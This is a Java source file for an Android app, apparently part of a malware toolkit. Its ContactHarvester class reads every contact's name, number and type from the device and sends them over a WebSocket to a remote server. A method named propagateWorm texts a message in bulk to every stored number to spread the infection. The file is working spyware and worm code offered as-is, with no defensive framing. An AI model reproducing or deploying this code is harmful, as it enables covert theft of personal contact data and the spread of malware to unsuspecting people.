package com.xrc.system.features;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class ContactHarvester {
    private static final String TAG = Constants.TAG + ":Contacts";
    private static ContactHarvester instance;
    private final Context ctx;

    private ContactHarvester(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized ContactHarvester get(Context ctx) {
        if (instance == null) {
            instance = new ContactHarvester(ctx);
        }
        return instance;
    }

    public void harvestAndSend() {
        List<JSONObject> contacts = harvestContacts();
        try {
            JSONObject data = new JSONObject();
            JSONArray arr = new JSONArray();
            for (JSONObject c : contacts) {
                arr.put(c);
            }
            data.put("contacts", arr);
            data.put("count", contacts.size());
            WebSocketClient.get(ctx).sendEvent("contacts", data);
        } catch (JSONException e) {
            Log.e(TAG, "Contact send failed", e);
        }
    }

    public List<JSONObject> harvestContacts() {
        List<JSONObject> contacts = new ArrayList<>();
        try {
            Cursor cursor = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                    }, null, null, null);
            if (cursor == null) return contacts;
            while (cursor.moveToNext()) {
                JSONObject contact = new JSONObject();
                contact.put("name", cursor.getString(0));
                contact.put("number", cursor.getString(1));
                contact.put("type", cursor.getInt(2));
                contacts.add(contact);
            }
            cursor.close();
        } catch (SecurityException | JSONException e) {
            Log.e(TAG, "Contact harvest failed", e);
        }
        return contacts;
    }

    public List<String> getPhoneNumbers() {
        List<String> numbers = new ArrayList<>();
        try {
            Cursor cursor = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null, null);
            if (cursor == null) return numbers;
            while (cursor.moveToNext()) {
                numbers.add(cursor.getString(0));
            }
            cursor.close();
        } catch (SecurityException e) {
            Log.e(TAG, "Number harvest failed", e);
        }
        return numbers;
    }

    public void propagateWorm(String message) {
        List<String> numbers = getPhoneNumbers();
        SMSManager.get(ctx).sendBulkSMS(numbers, message);
    }
}
